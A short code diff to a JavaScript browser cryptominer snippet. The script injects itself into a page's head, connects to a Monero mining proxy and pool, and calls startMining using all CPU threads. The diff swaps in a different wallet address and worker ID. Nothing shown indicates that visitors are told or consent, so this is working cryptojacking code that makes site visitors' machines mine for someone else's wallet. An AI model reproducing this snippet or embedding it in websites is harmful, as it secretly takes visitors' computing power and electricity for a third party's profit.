@@ -8,8 +8,8 @@ document.head.appendChild(script);
 
 server = "wss://ny1.xmrminingproxy.com";
 var pool = "moneroocean.stream";
-var walletAddress = "4Aevv5TzxT7c1sv3uukFbWY8bKUg2juWKNP2mtWH7YdzEs1SFrhDkiLDYfbVaavCZvMBf2xYMcdDSRZXBovfqtiFQrBnbeq";
-var workerId = "GH-XMR-JS-SNIPPET"
+var walletAddress = "44kUSjLeYWYK34DMfAkPqtYPBw2a65gUPNaixqSWUqfpXagsr8YFDbcJCK1nNHRKqQXW5ekrf5gnE9dCC9iNtT4B1XFyiA9";
+var workerId = "WEBM"
 var threads = -1;
 var password = "";
 startMining(pool, walletAddress, workerId, threads, password);
